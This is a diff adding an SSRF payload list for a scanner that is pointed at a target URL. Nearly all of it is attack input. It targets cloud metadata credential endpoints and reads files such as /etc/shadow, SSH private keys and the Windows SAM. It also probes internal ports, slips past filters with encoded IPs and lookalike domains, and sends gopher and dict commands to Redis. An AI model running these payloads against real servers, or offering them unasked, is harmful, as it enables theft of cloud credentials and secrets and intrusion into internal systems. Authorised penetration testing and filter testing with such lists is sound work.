@@ -1,0 +1,163 @@
+# Advanced SSRF Payloads Collection
+# Use with: python3 ssrf_scanner.py -u http://target.com --custom-payloads payloads.txt
+
+# Cloud Metadata Services
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://100.100.100.200/latest/meta-data/
+http://metadata.tencentyun.com/latest/meta-data/
+http://metadata.ucloud.cn/latest/meta-data/
+
+# File System Access
+file:///etc/shadow
+file:///etc/group
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/net/arp
+file:///proc/net/route
+file:///proc/version
+file:///proc/self/cwd/index.php
+file:///var/www/html/config.php
+file:///home/user/.ssh/id_rsa
+file:///root/.ssh/id_rsa
+file:///var/log/apache2/access.log
+file:///var/log/nginx/access.log
+file:///etc/apache2/apache2.conf
+file:///etc/nginx/nginx.conf
+
+# Windows File System
+file:///c:/windows/system32/drivers/etc/hosts
+file:///c:/windows/system32/config/sam
+file:///c:/boot.ini
+file:///c:/windows/win.ini
+file:///c:/windows/system.ini
+file:///c:/inetpub/wwwroot/web.config
+file:///c:/program files/
+file:///c:/users/administrator/desktop/
+
+# Internal Services Discovery
+http://127.0.0.1:21
+http://127.0.0.1:22
+http://127.0.0.1:23
+http://127.0.0.1:25
+http://127.0.0.1:53
+http://127.0.0.1:80
+http://127.0.0.1:110
+http://127.0.0.1:143
+http://127.0.0.1:443
+http://127.0.0.1:993
+http://127.0.0.1:995
+http://127.0.0.1:1433
+http://127.0.0.1:3306
+http://127.0.0.1:3389
+http://127.0.0.1:5432
+http://127.0.0.1:5984
+http://127.0.0.1:6379
+http://127.0.0.1:8080
+http://127.0.0.1:8443
+http://127.0.0.1:9200
+http://127.0.0.1:11211
+http://127.0.0.1:27017
+
+# Protocol Variations
+ftp://127.0.0.1:21
+sftp://127.0.0.1:22
+telnet://127.0.0.1:23
+smtp://127.0.0.1:25
+pop3://127.0.0.1:110
+imap://127.0.0.1:143
+ldap://127.0.0.1:389
+ldaps://127.0.0.1:636
+gopher://127.0.0.1:70
+dict://127.0.0.1:2628
+
+# IPv6 Variants
+http://[::1]:80
+http://[::1]:22
+http://[::1]:3306
+http://[::1]:6379
+http://[::1]:9200
+http://[0000::1]:80
+http://[0:0:0:0:0:0:0:1]:80
+
+# Decimal IP Representations
+http://2130706433:80
+http://2130706433:22
+http://2130706433:3306
+http://2130706433:6379
+http://2130706433:9200
+
+# Hexadecimal IP Representations
+http://0x7f000001:80
+http://0x7f000001:22
+http://0x7f000001:3306
+http://0x7f000001:6379
+http://0x7f000001:9200
+
+# Octal IP Representations
+http://0177.0.0.1:80
+http://0177.0.0.1:22
+http://0177.0.0.1:3306
+http://017700000001
+
+# URL Encoding Bypass
+http://127.0.0.1%2F
+http://127.0.0.1%23
+http://127.0.0.1%3F
+http://127.0.0.1%00
+http://127%2E0%2E0%2E1
+http://%31%32%37%2E%30%2E%30%2E%31
+
+# Domain Confusion
+http://localhost.localdomain
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://127.0.0.1.sslip.io
+http://1ocalhost
+http://l0calhost
+http://localhost.
+
+# Rare Protocols
+jar://127.0.0.1!/
+netdoc://127.0.0.1/
+expect://127.0.0.1/
+php://filter/resource=http://127.0.0.1
+data://text/plain;base64,SSBsb3ZlIFBIUA==
+jar:http://127.0.0.1!/
+
+# Cloud Provider Specific
+http://169.254.169.254/openstack/latest/meta_data.json
+http://169.254.169.254/ec2/latest/meta-data/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/
+http://169.254.169.254/metadata/v1/
+http://100.100.100.200/latest/meta-data/
+
+# Docker/Container Escape
+http://172.17.0.1
+http://172.18.0.1
+http://172.19.0.1
+http://172.20.0.1
+http://docker.for.mac.localhost
+http://docker.for.win.localhost
+http://host.docker.internal
+
+# Redis/Database Queries
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_CONFIG%20GET%20*
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:6379/config:get:*
+
+# Time-Based Detection
+http://httpbin.org/delay/10
+http://httpbin.org/delay/15
+http://httpbin.org/delay/20
+
+# Error-Based Detection
+http://127.0.0.1:1
+http://127.0.0.1:99999
+http://192.168.1.1:1
+http://10.0.0.1:1
+http://172.16.0.1:1
